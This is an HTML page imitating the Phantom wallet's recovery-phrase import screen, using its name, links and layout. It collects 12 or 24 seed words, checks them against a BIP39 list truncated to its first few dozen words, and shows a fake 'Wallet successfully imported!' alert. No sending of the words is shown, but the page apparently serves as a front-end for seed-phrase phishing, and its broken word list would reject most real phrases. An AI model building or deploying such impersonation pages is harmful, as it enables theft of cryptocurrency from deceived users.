<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #e5e5f0;
            color: #fff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 20px 24px;
            overflow: hidden;
        }

        /* Top Header Navigation */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
        }

        .logo-container {
            display: flex;
            align-items: center;
            cursor: pointer;
        }

        .logo-container svg {
            width: 24px;
            height: 24px;
            fill: #000;
        }

        .help-link {
            color: #000;
            background: transparent;
            border: 1px solid #b8b8c8;
            text-decoration: none;
            font-size: 13px;
            font-weight: 400;
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 4px 10px;
            border-radius: 6px;
        }

        .help-link:hover {
            background-color: rgba(0, 0, 0, 0.03);
        }

        /* Main Modal Container */
        .main-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            flex: 1;
        }

        .modal {
            background-color: #0c0c0e;
            width: 440px;
            border-radius: 20px;
            padding: 32px 24px 24px 24px;
            box-shadow: 0 16px 32px rgba(0, 0, 0, 0.25);
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
        }

        /* Pagination Dots */
        .dots {
            display: flex;
            gap: 6px;
            margin-bottom: 20px;
        }

        .dot {
            width: 5px;
            height: 5px;
            background-color: #3f3f46;
            border-radius: 50%;
        }

        .dot.active {
            background-color: #a855f7;
        }

        /* Modal Titles */
        .modal-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 6px;
            color: #fff;
            text-align: center;
        }

        .modal-subtitle {
            font-size: 12px;
            color: #71717a;
            margin-bottom: 20px;
            text-align: center;
            line-height: 1.4;
        }

        /* Inputs Grid */
        .inputs-container {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 6px;
            width: 100%;
            max-height: 200px;
            overflow-y: auto;
            padding-right: 2px;
            margin-bottom: 14px;
        }

        .inputs-container::-webkit-scrollbar {
            width: 3px;
        }

        .inputs-container::-webkit-scrollbar-thumb {
            background: #27272a;
            border-radius: 3px;
        }

        .input-group {
            position: relative;
            background-color: #18181b;
            border: 1px solid #27272a;
            border-radius: 8px;
            padding: 4px 8px;
            display: flex;
            flex-direction: column;
            transition: border-color 0.2s;
        }

        .input-group.error {
            border-color: #ef4444;
            background-color: rgba(239, 68, 68, 0.05);
        }

        .input-group label {
            font-size: 9px;
            color: #71717a;
            margin-bottom: 1px;
        }

        .input-group input {
            background: transparent;
            border: none;
            color: #fff;
            font-size: 12px;
            outline: none;
            width: 100%;
        }

        /* Error Label Text */
        .error-message {
            color: #ef4444;
            font-size: 11px;
            width: 100%;
            margin-bottom: 12px;
            display: none;
            text-align: center;
        }

        /* Switch Phrase Type Toggle */
        .toggle-phrase {
            color: #c084fc;
            background: none;
            border: none;
            font-size: 12px;
            cursor: pointer;
            margin-bottom: 16px;
            font-weight: 500;
        }

        .toggle-phrase:hover {
            text-decoration: underline;
        }

        /* Import Button */
        .import-btn {
            width: 100%;
            background-color: #fff;
            color: #000;
            border: none;
            border-radius: 10px;
            padding: 12px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .import-btn:hover {
            opacity: 0.9;
        }
    </style>
</head>
<body>

    <!-- Header -->
    <header>
        <a href="https://phantom.com" target="_blank" class="logo-container" title="Phantom">
            <svg viewBox="0 0 24 24"><path d="M12.01 0C5.38 0 0 5.38 0 12c0 6.63 5.38 12 12.01 12 6.62 0 11.99-5.37 11.99-12 0-6.62-5.37-12-11.99-12zm4.18 16.32c-.31.31-.81.31-1.12 0l-3.06-3.06-3.06 3.06c-.31.31-.81.31-1.12 0-.31-.31-.31-.81 0-1.12l3.06-3.06-3.06-3.06c-.31-.31-.31-.81 0-1.12.31-.31.81-.31 1.12 0l3.06 3.06 3.06-3.06c.31-.31.81-.31 1.12 0 .31.31.31.81 0 1.12l-3.06 3.06 3.06 3.06c.31.31.31.81 0 1.12z"/></svg>
        </a>
        <a href="https://phantom.com/help" target="_blank" class="help-link">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
            Help
        </a>
    </header>

    <!-- Main Section -->
    <div class="main-wrapper">
        <div class="modal">
            <div class="dots">
                <div class="dot active"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>

            <div class="modal-title">Recovery Phrase</div>
            <div class="modal-subtitle" id="subtitle-text">Import an existing wallet with your 12 or 24-word recovery phrase.</div>

            <div class="inputs-container" id="inputsGrid"></div>

            <div class="error-message" id="errorMessage">Word 1 is incorrect or misspelled</div>

            <button type="button" class="toggle-phrase" id="toggleBtn">I have a 24-word recovery phrase</button>

            <button type="button" class="import-btn" id="importBtn">Import Wallet</button>
        </div>
    </div>

    <!-- Script Logic -->
    <script>
        const bip39Words = [
            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst"
        ];

        let wordCount = 12;
        const inputsGrid = document.getElementById('inputsGrid');
        const toggleBtn = document.getElementById('toggleBtn');
        const subtitleText = document.getElementById('subtitle-text');
        const errorMessage = document.getElementById('errorMessage');
        const importBtn = document.getElementById('importBtn');

        function renderInputs() {
            inputsGrid.innerHTML = '';
            for (let i = 1; i <= wordCount; i++) {
                const group = document.createElement('div');
                group.className = 'input-group';
                group.id = `group-${i}`;
                group.innerHTML = `
                    <label>${i}.</label>
                    <input type="text" autocomplete="off" autocapitalize="off" spellcheck="false" data-index="${i}" id="word-${i}">
                `;
                inputsGrid.appendChild(group);
            }
        }

        toggleBtn.onclick = function() {
            if (wordCount === 12) {
                wordCount = 24;
                toggleBtn.textContent = "I have a 12-word recovery phrase";
                subtitleText.textContent = "Import an existing wallet with your 24-word recovery phrase.";
            } else {
                wordCount = 12;
                toggleBtn.textContent = "I have a 24-word recovery phrase";
                subtitleText.textContent = "Import an existing wallet with your 12 or 24-word recovery phrase.";
            }
            renderInputs();
            errorMessage.style.display = 'none';
        };

        importBtn.onclick = function() {
            let hasError = false;
            let firstErrorIndex = null;

            for (let i = 1; i <= wordCount; i++) {
                const inputVal = document.getElementById(`word-${i}`).value.trim().toLowerCase();
                const groupDiv = document.getElementById(`group-${i}`);

                if (inputVal === "" || !bip39Words.includes(inputVal)) {
                    groupDiv.classList.add('error');
                    if (!hasError) {
                        firstErrorIndex = i;
                    }
                    hasError = true;
                } else {
                    groupDiv.classList.remove('error');
                }
            }

            if (hasError) {
                errorMessage.textContent = `Word ${firstErrorIndex} is incorrect or misspelled`;
                errorMessage.style.display = 'block';
            } else {
                errorMessage.style.display = 'none';
                alert("Wallet successfully imported!");
            }
        };

        inputsGrid.addEventListener('input', (e) => {
            if (e.target.tagName === 'INPUT') {
                const index = e.target.getAttribute('data-index');
                document.getElementById(`group-${index}`).classList.remove('error');
                errorMessage.style.display = 'none';
            }
        });

        renderInputs();
    </script>
</body>
</html>
